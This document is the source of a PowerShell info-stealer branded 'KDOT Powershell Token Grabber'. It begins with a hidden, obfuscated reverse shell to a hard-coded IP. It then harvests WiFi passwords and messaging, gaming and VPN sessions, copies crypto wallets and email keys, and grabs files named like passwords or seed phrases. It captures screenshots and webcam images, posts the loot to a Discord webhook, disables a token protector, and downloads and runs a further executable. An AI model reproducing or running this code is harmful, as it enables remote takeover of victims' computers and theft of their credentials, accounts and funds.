Start-Process $PSHOME\powershell.exe -ArgumentList {$5a73d5e9a3c14a0e95f8794422b3984a = New-Object System.Net.Sockets.TCPClient('192.168.188.30',4443);$3e54d96c8e0d4d0d9416f7e63f51c5b4 = $5a73d5e9a3c14a0e95f8794422b3984a.GetStream();[byte[]]$abf7f8097d4642b7a8ae320079dbd27e = 0..65535|%{0};while(($i = $3e54d96c8e0d4d0d9416f7e63f51c5b4.Read($abf7f8097d4642b7a8ae320079dbd27e, 0, $abf7f8097d4642b7a8ae320079dbd27e.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($abf7f8097d4642b7a8ae320079dbd27e,0, $i);$23b7ef29a53a45e3b9f347bc337a5bbd = (ie''x $data 2>&1 | Out-String );$23b7ef29a53a45e3b9f347bc337a5bbd2 = $23b7ef29a53a45e3b9f347bc337a5bbd + 'PS ' + (pw''d).Path + '> ';$5a6e60a3d3ef45e880ef5b2be99a1c19 = ([text.encoding]::ASCII).GetBytes($23b7ef29a53a45e3b9f347bc337a5bbd2);$3e54d96c8e0d4d0d9416f7e63f51c5b4.Write($5a6e60a3d3ef45e880ef5b2be99a1c19,0,$5a6e60a3d3ef45e880ef5b2be99a1c19.Length);$3e54d96c8e0d4d0d9416f7e63f51c5b4.Flush()};$5a73d5e9a3c14a0e95f8794422b3984a.Close()} -WindowStyle Hidden
$ErrorActionPreference = 'SilentlyContinue' # Ignore all warnings
$ProgressPreference = 'SilentlyContinue' # Hide all Progresses

# Single Instance (no overloads)
function MUTEX-CHECK {
    $AppId = "16fcb8bb-e281-472d-a9f6-39f0f32f19f2" # This GUID string is changeable
    $CreatedNew = $false
    $script:SingleInstanceEvent = New-Object Threading.EventWaitHandle $true, ([Threading.EventResetMode]::ManualReset), "Global\$AppID", ([ref] $CreatedNew)
    if( -not $CreatedNew ) {
        #throw "An instance of this script is already running."
    } else {
        Invoke-ANTITOTAL
    }
    
}

function CHECK_IF_ADMIN {
    $test = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator); echo $test
}

function EXFILTRATE-DATA {
    $ip = Invoke-WebRequest -Uri "https://api.ipify.org" -UseBasicParsing
    $ip = $ip.Content
    $ip > $env:LOCALAPPDATA\Temp\ip.txt
    $lang = (Get-WinUserLanguageList).LocalizedName
    $date = (get-date).toString("r")
    Get-ComputerInfo > $env:LOCALAPPDATA\Temp\system_info.txt
    $osversion = (Get-WmiObject -class Win32_OperatingSystem).Caption
    $osbuild = (Get-ItemProperty -Path c:\windows\system32\hal.dll).VersionInfo.FileVersion
    $displayversion = (Get-Item "HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion").GetValue('DisplayVersion')
    $model = (Get-WmiObject -Class:Win32_ComputerSystem).Model
    $uuid = Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID 
    $uuid > $env:LOCALAPPDATA\Temp\uuid.txt
    $cpu = Get-WmiObject -Class Win32_Processor | Select-Object -ExpandProperty Name
    $cpu > $env:LOCALAPPDATA\Temp\cpu.txt
    $gpu = (Get-WmiObject Win32_VideoController).Name 
    $gpu > $env:LOCALAPPDATA\Temp\GPU.txt
    $format = " GB"
    $total = Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | Foreach {"{0:N2}" -f ([math]::round(($_.Sum / 1GB),2))}
    $raminfo = "$total" + "$format"  
    $mac = (Get-WmiObject win32_networkadapterconfiguration -ComputerName $env:COMPUTERNAME | Where{$_.IpEnabled -Match "True"} | Select-Object -Expand macaddress) -join ","
    $mac > $env:LOCALAPPDATA\Temp\mac.txt
    $username = $env:USERNAME
    $hostname = $env:COMPUTERNAME
    $netstat = netstat -ano > $env:LOCALAPPDATA\Temp\netstat.txt
    $mfg = (gwmi win32_computersystem).Manufacturer 
    
    # System Uptime
    function Get-Uptime {
        $ts = (Get-Date) - (Get-CimInstance -ClassName Win32_OperatingSystem -ComputerName $computername).LastBootUpTime
        $uptimedata = '{0} days {1} hours {2} minutes {3} seconds' -f $ts.Days, $ts.Hours, $ts.Minutes, $ts.Seconds
        $uptimedata
    }
    $uptime = Get-Uptime
    
    # List of Installed AVs
    function get-installed-av {
        $wmiQuery = "SELECT * FROM AntiVirusProduct"
        $AntivirusProduct = Get-WmiObject -Namespace "root\SecurityCenter2" -Query $wmiQuery  @psboundparameters 
        $AntivirusProduct.displayName 
    }
    $avlist = get-installed-av -autosize | ft | out-string
    
    # Extracts all Wifi Passwords
    $wifipasslist = netsh wlan show profiles | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)}  | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ PROFILE_NAME=$name;PASSWORD=$pass }} | out-string
    $wifi = $wifipasslist | out-string 
    $wifi > $env:temp\WIFIPasswords.txt
    
    # Screen Resolution
    $width = (((Get-WmiObject -Class Win32_VideoController).VideoModeDescription  -split '\n')[0]  -split ' ')[0]
    $height = (((Get-WmiObject -Class Win32_VideoController).VideoModeDescription  -split '\n')[0]  -split ' ')[2]  
    $split = "x"
    $screen = "$width" + "$split" + "$height"  
    $screen
    
    # Startup Apps , Running Services, Processes, Installed Applications, and Network Adapters
    function misc {
        Get-CimInstance Win32_StartupCommand | Select-Object Name, command, Location, User | Format-List > $env:temp\StartUpApps.txt
        Get-WmiObject win32_service |? State -match "running" | select Name, DisplayName, PathName, User | sort Name | ft -wrap -autosize >  $env:LOCALAPPDATA\Temp\running-services.txt
        Get-WmiObject win32_process | Select-Object Name,Description,ProcessId,ThreadCount,Handles,Path | ft -wrap -autosize > $env:temp\running-applications.txt
        Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table > $env:temp\Installed-Applications.txt
        Get-NetAdapter | ft Name,InterfaceDescription,PhysicalMediaType,NdisPhysicalMedium -AutoSize > $env:temp\NetworkAdapters.txt
    }
    misc 
    
    # All Messaging Sessions
    New-Item -Path "$env:localappdata\Temp" -Name "Messaging Sessions" -ItemType Directory -force | out-null
    $messaging_sessions = "$env:localappdata\Temp\Messaging Sessions"                                       

    # Telegram Session Stealer
    function telegramstealer {
        $processname = "telegram"
        try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
        $path = "$env:userprofile\AppData\Roaming\Telegram Desktop\tdata"
        $destination = "$messaging_sessions\Telegram.zip"
        $exclude = @("_*.config","dumps","tdummy","emoji","user_data","user_data#2","user_data#3","user_data#4","user_data#5","user_data#6","*.json","webview")
        $files = Get-ChildItem -Path $path -Exclude $exclude
        Compress-Archive -Path $files -DestinationPath $destination -CompressionLevel Fastest -Force
    }
    telegramstealer 
    
    # Element Session Stealer
    function elementstealer {
        $processname = "element"
        try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
        $element_session = "$messaging_sessions\Element"
        New-Item -ItemType Directory -Force -Path $element_session
        $elementfolder = "$env:userprofile\AppData\Roaming\Element"
        Copy-Item -Path "$elementfolder\databases" -Destination $element_session -Recurse -force
        Copy-Item -Path "$elementfolder\Local Storage" -Destination $element_session -Recurse -force
        Copy-Item -Path "$elementfolder\Session Storage" -Destination $element_session -Recurse -force
        Copy-Item -Path "$elementfolder\IndexedDB" -Destination $element_session -Recurse -force
        Copy-Item -Path "$elementfolder\sso-sessions.json" -Destination $element_session -Recurse -force
    }
    elementstealer 
	
	# ICQ Session Stealer
    function icqstealer {
            $processname = "icq"
            try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
            $icq_session = "$messaging_sessions\ICQ"
            New-Item -ItemType Directory -Force -Path $icq_session
            $icqfolder = "$env:userprofile\AppData\Roaming\ICQ"
            Copy-Item -Path "$icqfolder\0001" -Destination $icq_session -Recurse -force
    
    }
    icqstealer
        
    # Signal Session Stealer
    function signalstealer {
        $processname = "signal"
        try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
        $signal_session = "$messaging_sessions\Signal"
        New-Item -ItemType Directory -Force -Path $signal_session
        $signalfolder = "$env:userprofile\AppData\Roaming\Signal"
        Copy-Item -Path "$signalfolder\databases" -Destination $signal_session -Recurse -force
        Copy-Item -Path "$signalfolder\Local Storage" -Destination $signal_session -Recurse -force
        Copy-Item -Path "$signalfolder\Session Storage" -Destination $signal_session -Recurse -force
        Copy-Item -Path "$signalfolder\sql" -Destination $signal_session -Recurse -force
        Copy-Item -Path "$signalfolder\config.json" -Destination $signal_session -Recurse -force
    }
    signalstealer 
	
	# Viber Session Stealer
    function viberstealer {
            $processname = "viber"
            try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
            $viber_session = "$messaging_sessions\Viber"
            New-Item -ItemType Directory -Force -Path $viber_session
            $viberfolder = "$env:userprofile\AppData\Roaming\ViberPC"
            $configfiles = @("config$1")
            foreach($file in $configfiles) {
                Get-ChildItem -path $viberfolder -Filter ([regex]::escape($file) + "*") -Recurse -File | ForEach { Copy-Item -path $PSItem.FullName -Destination $viber_session }
            }
    		$pattern = "^([\+|0-9 ][ 0-9.]{1,12})$"
            $directories = Get-ChildItem -Path $viberFolder -Directory | Where-Object { $_.Name -match $pattern }
            foreach ($directory in $directories) {
                $destinationPath = Join-Path -Path $viber_session -ChildPath $directory.Name
                Copy-Item -Path $directory.FullName -Destination $destinationPath -Force
            }
            $files = Get-ChildItem -Path $viberFolder -File -Recurse -Include "*.db", "*.db-shm", "*.db-wal" | Where-Object { -not $_.PSIsContainer }
                foreach ($file in $files) {
                    $parentFolder = Split-Path -Path $file.FullName -Parent
                    $phoneNumberFolder = Get-ChildItem -Path $parentFolder -Directory | Where-Object { $_.Name -match $pattern}
                    if (-not $phoneNumberFolder) {
                        Copy-Item -Path $file.FullName -Destination $destinationPath
                 }
           }
    }
    viberstealer 
	
	# Whatsapp Session Stealer
    function whatsappstealer {
                $processname = "whatsapp"
                try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
                $whatsapp_session = "$messaging_sessions\Whatsapp"
                New-Item -ItemType Directory -Force -Path $whatsapp_session
                $regexPattern = "WhatsAppDesktop"
                $parentFolder = Get-ChildItem -Path "$env:localappdata\Packages" -Directory | Where-Object { $_.Name -match $regexPattern }
                if ($parentFolder){
                $localStateFolder = Get-ChildItem -Path $parentFolder.FullName -Filter "LocalState" -Recurse -Directory
                if ($localStateFolder) {
                $destinationPath = Join-Path -Path $whatsapp_session -ChildPath $localStateFolder.Name
                Copy-Item -Path $localStateFolder.FullName -Destination $destinationPath -Recurse
               }
          }
    }
    whatsappstealer	

    # All Gaming Sessions
    New-Item -Path "$env:localappdata\Temp" -Name "Gaming Sessions" -ItemType Directory -force | out-null
    $gaming_sessions = "$env:localappdata\Temp\Gaming Sessions"

    # Steam Session Stealer
    function steamstealer {
        $processname = "steam"
        try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
        $steam_session = "$gaming_sessions\Steam"
        New-Item -ItemType Directory -Force -Path $steam_session
        $steamfolder = ("${Env:ProgramFiles(x86)}\Steam")
        Copy-Item -Path "$steamfolder\config" -Destination $steam_session -Recurse -force
        $ssfnfiles = @("ssfn$1")
        foreach($file in $ssfnfiles) {
            Get-ChildItem -path $steamfolder -Filter ([regex]::escape($file) + "*") -Recurse -File | ForEach { Copy-Item -path $PSItem.FullName -Destination $steam_session }
        }
    }
    steamstealer 
    
    # Minecraft Session Stealer
    function minecraftstealer {
        $minecraft_session = "$gaming_sessions\Minecraft"
        New-Item -ItemType Directory -Force -Path $minecraft_session
        $minecraftfolder1 = $env:appdata + "\.minecraft"
        $minecraftfolder2 = $env:userprofile + "\.lunarclient\settings\game"
        Get-ChildItem $minecraftfolder1 -Include "*.json" -Recurse | Copy-Item -Destination $minecraft_session
        Get-ChildItem $minecraftfolder2 -Include "*.json" -Recurse | Copy-Item -Destination $minecraft_session
    }
    minecraftstealer 
    
    # Epicgames Session Stealer
    function epicgames_stealer {
            $processname = "epicgameslauncher"
            try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
            $epicgames_session = "$gaming_sessions\EpicGames"
            New-Item -ItemType Directory -Force -Path $epicgames_session
            $epicgamesfolder = "$env:localappdata\EpicGamesLauncher"
            Copy-Item -Path "$epicgamesfolder\Saved\Config" -Destination $epicgames_session -Recurse -force
            Copy-Item -Path "$epicgamesfolder\Saved\Logs" -Destination $epicgames_session -Recurse -force
            Copy-Item -Path "$epicgamesfolder\Saved\Data" -Destination $epicgames_session -Recurse -force
    }
    epicgames_stealer 
    
    # Ubisoft Session Stealer
    function ubisoftstealer {
            $processname = "upc"
            try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
            $ubisoft_session = "$gaming_sessions\Ubisoft"
            New-Item -ItemType Directory -Force -Path $ubisoft_session
            $ubisoftfolder = "$env:localappdata\Ubisoft Game Launcher"
            Copy-Item -Path "$ubisoftfolder" -Destination $ubisoft_session -Recurse -force
    }
    ubisoftstealer 
    
    # EA Session Stealer
    function electronic_arts {
            $processname = "eadesktop"
            try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
            $ea_session = "$gaming_sessions\Electronic Arts"
            New-Item -ItemType Directory -Force -Path $ea_session
            $eafolder = "$env:localappdata\Electronic Arts"
            Copy-Item -Path "$eafolder" -Destination $ea_session -Recurse -force
    }
    electronic_arts  

   # Growtopia Stealer
   function growtopiastealer {
               $processname = "growtopia"
               try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
               $growtopia_session = "$gaming_sessions\Growtopia"
               New-Item -ItemType Directory -Force -Path $growtopia_session
               $growtopiafolder = "$env:localappdata\Growtopia"
               Copy-Item -Path "$growtopiafolder\save.dat" -Destination $growtopia_session -Recurse -force
       
   }
   growtopiastealer	
	
	# All VPN Clients
	New-Item -Path "$env:localappdata\Temp" -Name "VPN Clients" -ItemType Directory -force | out-null
    $vpn_clients = "$env:localappdata\Temp\VPN Clients"                                       
    
	# NordVPN 
    function nordvpnstealer {
            $processname = "nordvpn"
            try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
            $nordvpn_account = "$vpn_clients\NordVPN"
            New-Item -ItemType Directory -Force -Path $nordvpn_account
            $nordvpnfolder = "$env:localappdata\nordvpn"
    		$pattern = "^([A-Za-z]+\.exe_Path_[A-Za-z0-9]+)$"
            $directories = Get-ChildItem -Path $nordvpnfolder -Directory | Where-Object { $_.Name -match $pattern }
            $files = Get-ChildItem -Path $nordvpnfolder -File | Where-Object { $_.Name -match $pattern }
            foreach ($directory in $directories) {
            $destinationPath = Join-Path -Path $nordvpn_account -ChildPath $directory.Name
            Copy-Item -Path $directory.FullName -Destination $destinationPath -Recurse -Force
            }
            foreach ($file in $files) {
            $destinationPath = Join-Path -Path $nordvpn_account -ChildPath $file.Name
            Copy-Item -Path $file.FullName -Destination $destinationPath -Force
            }
    		Copy-Item -Path "$nordvpnfolder\ProfileOptimization" -Destination $nordvpn_account -Recurse -force   
            Copy-Item -Path "$nordvpnfolder\libmoose.db" -Destination $nordvpn_account -Recurse -force
    }
    nordvpnstealer
	
	# ProtonVPN
	function protonvpnstealer {
        $processname = "protonvpn"
        try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
        $protonvpn_account = "$vpn_clients\ProtonVPN"
        New-Item -ItemType Directory -Force -Path $protonvpn_account
        $protonvpnfolder = "$env:localappdata\protonvpn"  
		$pattern = "^(ProtonVPN_Url_[A-Za-z0-9]+)$"
        $directories = Get-ChildItem -Path $protonvpnfolder -Directory | Where-Object { $_.Name -match $pattern }
        $files = Get-ChildItem -Path $protonvpnfolder -File | Where-Object { $_.Name -match $pattern }
        foreach ($directory in $directories) {
        $destinationPath = Join-Path -Path $protonvpn_account -ChildPath $directory.Name
        Copy-Item -Path $directory.FullName -Destination $destinationPath -Recurse -Force
        }
        foreach ($file in $files) {
        $destinationPath = Join-Path -Path $protonvpn_account -ChildPath $file.Name
        Copy-Item -Path $file.FullName -Destination $destinationPath -Force
        }
        Copy-Item -Path "$protonvpnfolder\Startup.profile" -Destination $protonvpn_account -Recurse -force
        }
    protonvpnstealer
	
	#Surfshark VPN
	function surfsharkvpnstealer {
        $processname = "Surfshark"
        try {if (Get-Process $processname ) {Get-Process -Name $processname | Stop-Process }} catch {}
        $surfsharkvpn_account = "$vpn_clients\Surfshark"
        New-Item -ItemType Directory -Force -Path $surfsharkvpn_account
        $surfsharkvpnfolder = "$env:appdata\Surfshark"  
		Get-ChildItem $surfsharkvpnfolder -Include @("data.dat", "settings.dat", "settings-log.dat", "private_settings.dat") -Recurse | Copy-Item -Destination $surfsharkvpn_account
    }
    surfsharkvpnstealer
    
    # Desktop screenshot
    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
    $screens = [Windows.Forms.Screen]::AllScreens
    $top    = ($screens.Bounds.Top    | Measure-Object -Minimum).Minimum
    $left   = ($screens.Bounds.Left   | Measure-Object -Minimum).Minimum
    $width  = ($screens.Bounds.Right  | Measure-Object -Maximum).Maximum
    $height = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum
    $bounds   = [Drawing.Rectangle]::FromLTRB($left, $top, $width, $height)
    $bmp      = New-Object System.Drawing.Bitmap ([int]$bounds.width), ([int]$bounds.height)
    $graphics = [Drawing.Graphics]::FromImage($bmp)
    $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)
    $bmp.Save("$env:localappdata\temp\desktop-screenshot.png")
    $graphics.Dispose()
    $bmp.Dispose()
    
    # Disk Information
    function diskdata {
        $disks = get-wmiobject -class "Win32_LogicalDisk" -namespace "root\CIMV2"
        $results = foreach ($disk in $disks) {
            if ($disk.Size -gt 0) {
                $SizeOfDisk = [math]::round($disk.Size/1GB, 0)
                $FreeSpace = [math]::round($disk.FreeSpace/1GB, 0)
                $usedspace = [math]::round(($disk.size - $disk.freespace) / 1GB, 2)
                [int]$FreePercent = ($FreeSpace/$SizeOfDisk) * 100
                [int]$usedpercent = ($usedspace/$SizeOfDisk) * 100
                [PSCustomObject]@{
                    Drive = $disk.Name
                    Name = $disk.VolumeName
                    "Total Disk Size" = "{0:N0} GB" -f $SizeOfDisk 
                    "Free Disk Size" = "{0:N0} GB ({1:N0} %)" -f $FreeSpace, ($FreePercent)
                    "Used Space" = "{0:N0} GB ({1:N0} %)" -f $usedspace, ($usedpercent)
                }
            }
        }
        $results | out-string 
    }
    $alldiskinfo = diskdata
    $alldiskinfo > $env:temp\DiskInfo.txt
    
    #Extracts Product Key
    function Get-ProductKey {
        try {
            $regPath = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform'
            $keyName = 'BackupProductKeyDefault'
            $backupProductKey = Get-ItemPropertyValue -Path $regPath -Name $keyName
            return $backupProductKey
        } catch {
            return "No product key found"
        }
    }
    
    Get-ProductKey > $env:localappdata\temp\ProductKey.txt    
    
    # Create temporary directory to store wallet data for exfiltration
    New-Item -Path "$env:localappdata\Temp" -Name "Crypto Wallets" -ItemType Directory -force | out-null
    $crypto = "$env:localappdata\Temp\Crypto Wallets"
    
    New-Item -Path "$env:localappdata\Temp" -Name "Email Clients" -ItemType Directory -force | out-null
    $emailclientsfolder = "$env:localappdata\Temp\Email Clients"
    
    # Thunderbird Exfil
    $Thunderbird = @('key4.db', 'key3.db', 'logins.json', 'cert9.db')
    If (Test-Path -Path "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles") {
    New-Item -Path "$emailclientsfolder\Thunderbird" -ItemType Directory | Out-Null
    Get-ChildItem "$env:USERPROFILE\AppData\Roaming\Thunderbird\Profiles" -Include $Thunderbird -Recurse | Copy-Item -Destination "$emailclientsfolder\Thunderbird" -Recurse -Force
    }
    
    # Crypto Wallets
    
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\Armory") {
    New-Item -Path "$crypto\Armory" -ItemType Directory | Out-Null
    Get-ChildItem "$env:userprofile\AppData\Roaming\Armory" -Recurse | Copy-Item -Destination "$crypto\Armory" -Recurse -Force
    }
    
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\Atomic") {
    New-Item -Path "$crypto\Atomic" -ItemType Directory | Out-Null
    Get-ChildItem "$env:userprofile\AppData\Roaming\Atomic\Local Storage\leveldb" -Recurse | Copy-Item -Destination "$crypto\Atomic" -Recurse -Force
    }
    
    If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\Bitcoin") {
    New-Item -Path "$crypto\BitcoinCore" -ItemType Directory | Out-Null
    Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\Bitcoin\Bitcoin-Qt" -Name strDataDir).strDataDir -Include *wallet.dat -Recurse | Copy-Item -Destination "$crypto\BitcoinCore" -Recurse -Force
    }
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\bytecoin") {
    New-Item -Path "$crypto\bytecoin" -ItemType Directory | Out-Null
    Get-ChildItem ("$env:userprofile\AppData\Roaming\bytecoin", "$env:userprofile") -Include *.wallet -Recurse | Copy-Item -Destination "$crypto\bytecoin" -Recurse -Force
    }
    If (Test-Path -Path "$env:userprofile\AppData\Local\Coinomi") {
    New-Item -Path "$crypto\Coinomi" -ItemType Directory | Out-Null
    Get-ChildItem "$env:userprofile\AppData\Local\Coinomi\Coinomi\wallets" -Recurse | Copy-Item -Destination "$crypto\Coinomi" -Recurse -Force
    }
    If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\Dash") {
    New-Item -Path "$crypto\DashCore" -ItemType Directory | Out-Null
    Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\Dash\Dash-Qt" -Name strDataDir).strDataDir -Include *wallet.dat -Recurse | Copy-Item -Destination "$crypto\DashCore" -Recurse -Force
    }
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\Electrum") {
    New-Item -Path "$crypto\Electrum" -ItemType Directory | Out-Null
    Get-ChildItem "$env:userprofile\AppData\Roaming\Electrum\wallets" -Recurse | Copy-Item -Destination "$crypto\Electrum" -Recurse -Force
    }
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\Ethereum") {
    New-Item -Path "$crypto\Ethereum" -ItemType Directory | Out-Null
    Get-ChildItem "$env:userprofile\AppData\Roaming\Ethereum\keystore" -Recurse | Copy-Item -Destination "$crypto\Ethereum" -Recurse -Force
    }
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\Exodus") {
    New-Item -Path "$crypto\exodus.wallet" -ItemType Directory | Out-Null
    Get-ChildItem "$env:userprofile\AppData\Roaming\exodus.wallet" -Recurse | Copy-Item -Destination "$crypto\exodus.wallet" -Recurse -Force
    }
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\Guarda") {
    New-Item -Path "$crypto\Guarda" -ItemType Directory | Out-Null
    Get-ChildItem "$env:userprofile\AppData\Roaming\Guarda\IndexedDB" -Recurse | Copy-Item -Destination "$crypto\Guarda" -Recurse -Force
    }
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\com.liberty.jaxx") {
    New-Item -Path "$crypto\liberty.jaxx" -ItemType Directory | Out-Null
    Get-ChildItem "$env:userprofile\AppData\Roaming\com.liberty.jaxx\IndexedDB\file__0.indexeddb.leveldb" -Recurse | Copy-Item -Destination "$crypto\liberty.jaxx" -Recurse -Force
    }
    If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\Litecoin") {
    New-Item -Path "$crypto\Litecoin" -ItemType Directory | Out-Null
    Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\Litecoin\Litecoin-Qt" -Name strDataDir).strDataDir -Include *wallet.dat -Recurse | Copy-Item -Destination "$crypto\Litecoin" -Recurse -Force
    }
    If (Test-Path -Path "Registry::HKEY_CURRENT_USER\software\monero-project") {
    New-Item -Path "$crypto\Monero" -ItemType Directory | Out-Null
    Get-ChildItem (Get-ItemProperty -Path "Registry::HKEY_CURRENT_USER\software\monero-project\monero-core" -Name wallet_path).wallet_path -Recurse | Copy-Item -Destination "$crypto\Monero" -Recurse  -Force
    }
    If (Test-Path -Path "$env:userprofile\AppData\Roaming\Zcash") {
    New-Item -Path "$crypto\Zcash" -ItemType Directory | Out-Null
    Get-ChildItem "$env:userprofile\AppData\Roaming\Zcash" -Recurse | Copy-Item -Destination "$crypto\Zcash" -Recurse -Force
    }

    #Files Grabber 
    New-Item -Path "$env:localappdata\Temp" -Name "Files Grabber" -ItemType Directory -force | out-null
    $filegrabber = "$env:localappdata\Temp\Files Grabber"
    Function GrabFiles {
        $grabber = @(
            "2fa",
            "acc",
            "account",
            "backup",
            "backupcode",
            "bitwarden",
            "code",
            "coinbase",
            "crypto",
            "dashlane",
            "default",
            "discord",
            "disk",
            "eth",
            "exodus",
            "facebook",
            "fb",
            "keepass",
            "keepassxc",
            "keys",
            "lastpass",
            "login",
            "mail",
            "memo",
            "metamask",
            "nordpass",
            "pass",
            "paypal",
            "private",
            "pw",
            "recovery",
            "remote",
            "secret",
            "seedphrase",
	        "wallet seed",
            "server",
            "syncthing",
            "token",
            "wal",
            "wallet"
        )
        $dest = "$env:localappdata\Temp\Files Grabber"
        $paths = "$env:userprofile\Downloads", "$env:userprofile\Documents", "$env:userprofile\Desktop"
        [regex] $grab_regex = "(" + (($grabber |foreach {[regex]::escape($_)}) -join "|") + ")"
        (gci -path $paths -Include "*.pdf","*.txt","*.doc","*.csv","*.rtf","*.docx" -r | ? Length -lt 5mb) -match $grab_regex | Copy-Item -Destination $dest -Force
    }
    GrabFiles
    
    $embed_and_body = @{
        "username" = "KDOT"
        "content" = "@everyone"
        "title" = "KDOT"
        "description" = "Powerful Token Grabber"
        "color" = "3447003"
        "avatar_url" = "https://i.postimg.cc/k58gQ03t/PTG.gif"
        "url" = "https://discord.gg/vk3rBhcj2y"
        "embeds" = @(
            @{
                "title" = "POWERSHELL GRABBER"
                "url" = "https://github.com/KDot227/Powershell-Token-Grabber/tree/main"
                "description" = "New victim info collected !"
                "color" = "3447003"
                "footer" = @{
                    "text" = "Made by KDOT, GODFATHER and CHAINSKI"
                }
                "thumbnail" = @{
                    "url" = "https://i.postimg.cc/k58gQ03t/PTG.gif"
                }
                "fields" = @(
                    @{
                        "name" = ":satellite: IP"
                        "value" = "``````$ip``````"
                    },
                    @{
                        "name" = ":bust_in_silhouette: User Information"
                        "value" = "``````Date: $date `nLanguage: $lang `nUsername: $username `nHostname: $hostname``````"
                    },
                    @{
                        "name" = ":shield: Antivirus"
                        "value" = "``````$avlist``````"
                    },
                    @{
                        "name" = ":computer: Hardware"
                        "value" = "``````Screen Size: $screen `nOS: $osversion `nOS Build: $osbuild `nOS Version: $displayversion `nManufacturer: $mfg `nModel: $model `nCPU: $cpu `nGPU: $gpu `nRAM: $raminfo `nHWID: $uuid `nMAC: $mac `nUptime: $uptime``````"
                    },
                    @{
                        "name" = ":floppy_disk: Disk"
                        "value" = "``````$alldiskinfo``````"
                    }
                    @{
                        "name" = ":signal_strength: WiFi"
                        "value" = "``````$wifi``````"
                    }
                )
            }
        )
    }

    $payload = $embed_and_body | ConvertTo-Json -Depth 10
    Invoke-WebRequest -Uri $webhook -Method POST -Body $payload -ContentType "application/json" -UseBasicParsing | Out-Null

    Get-WebCamImage

    curl.exe -F "payload_json={\`"username\`": \`"KDOT\`", \`"content\`": \`":hamsa: **Screenshot**\`"}" -F "file=@\`"$env:localappdata\temp\desktop-screenshot.png\`"" $webhook | out-null

    $items = Get-ChildItem -Path $env:localappdata\temp\ -Filter out*.jpg
    foreach ($item in $items) {
        $name = $item.Name
        curl.exe -F "payload_json={\`"username\`": \`"KDOT\`", \`"content\`": \`":hamsa: **webcam**\`"}" -F "file=@\`"$env:localappdata\temp\$name\`"" $webhook | out-null
        Remove-Item $item.Name -Force
    }

    Set-Location $env:LOCALAPPDATA\Temp

    $token_prot = Test-Path "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe"
    if ($token_prot -eq $true) {
        Stop-Process -Name DiscordTokenProtector -Force
        Remove-Item "$env:APPDATA\DiscordTokenProtector\DiscordTokenProtector.exe" -Force
    }

    $secure_dat = Test-Path "$env:APPDATA\DiscordTokenProtector\secure.dat"
    if ($secure_dat -eq $true) {
        Remove-Item "$env:APPDATA\DiscordTokenProtector\secure.dat" -Force
    }

    $TEMP_KDOT = Test-Path "$env:LOCALAPPDATA\Temp\KDOT"
    if ($TEMP_KDOT -eq $false) {
        New-Item "$env:LOCALAPPDATA\Temp\KDOT" -Type Directory
    }

    #Disable system start discord on startup (The Program Automatically Restarts It)
    Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Discord Inc\Discord.lnk" -Force
    Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'Discord' -Force
    
    #Invoke-WebRequest -Uri "https://github.com/KDot227/Powershell-Token-Grabber/releases/download/V4.2/main.exe" -OutFile "main.exe" -UseBasicParsing
    (New-Object System.Net.WebClient).DownloadFile("https://github.com/KDot227/Powershell-Token-Grabber/releases/download/V4.2/main.exe", "$env:LOCALAPPDATA\Temp\main.exe")

    #This is needed for the injection to work
    Stop-Process -Name discord -Force
    Stop-Process -Name discordcanary -Force
    Stop-Process -Name discordptb -Force

    $proc = Start-Process $env:LOCALAPPDATA\Temp\main.exe -ArgumentList "$webhook" -NoNewWindow -PassThru
    $proc.WaitForExit()

    $extracted = "$env:LOCALAPPDATA\Temp"
